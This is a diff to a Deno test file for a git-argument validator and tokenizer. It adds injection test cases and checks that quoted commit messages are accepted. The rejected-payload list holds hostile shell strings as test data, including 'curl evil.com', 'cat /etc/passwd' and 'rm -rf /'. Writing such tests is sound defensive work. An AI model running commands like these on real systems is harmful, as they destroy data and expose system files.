@@ -41,6 +41,7 @@ Deno.test("validateBranchName rejects leading dash, .., and whitespace", () => {
 Deno.test("validateGitCommandArgs rejects injection payloads", () => {
   const payloads = [
     "status; curl evil.com",
+    "status; echo pwned",
     "log | cat /etc/passwd",
     "show $(whoami)",
     "status && rm -rf /",
@@ -52,16 +53,25 @@ Deno.test("validateGitCommandArgs rejects injection payloads", () => {
   }
 });
 
-Deno.test("validateGitCommandArgs accepts normal git args", () => {
+Deno.test("validateGitCommandArgs accepts normal and quoted git args", () => {
   assertEquals(validateGitCommandArgs("status").valid, true);
   assertEquals(validateGitCommandArgs("log --oneline -5").valid, true);
   assertEquals(validateGitCommandArgs("diff HEAD~1").valid, true);
+  assertEquals(validateGitCommandArgs('commit -m "fix stuff"').valid, true);
+  assertEquals(validateGitCommandArgs("commit -m 'fix stuff'").valid, true);
+  assertEquals(validateGitCommandArgs('commit -m "fix; stuff"').valid, true);
+  assertEquals(validateGitCommandArgs("git status").valid, true);
 });
 
 Deno.test("splitGitArgs tokenizes validated command strings for argv spawn", () => {
   assertEquals(splitGitArgs("status"), ["status"]);
   assertEquals(splitGitArgs("log --oneline -5"), ["log", "--oneline", "-5"]);
   assertEquals(splitGitArgs("  diff HEAD~1  "), ["diff", "HEAD~1"]);
+  assertEquals(splitGitArgs('commit -m "fix stuff"'), ["commit", "-m", "fix stuff"]);
+  assertEquals(splitGitArgs("commit -m 'fix stuff'"), ["commit", "-m", "fix stuff"]);
+  assertEquals(splitGitArgs('commit -m "fix; stuff"'), ["commit", "-m", "fix; stuff"]);
+  assertEquals(splitGitArgs("git status"), ["status"]);
+  assertEquals(splitGitArgs('git commit -m "msg"'), ["commit", "-m", "msg"]);
 });
 
 Deno.test("shouldTruncateOutput triggers at 10 MB boundary", () => {
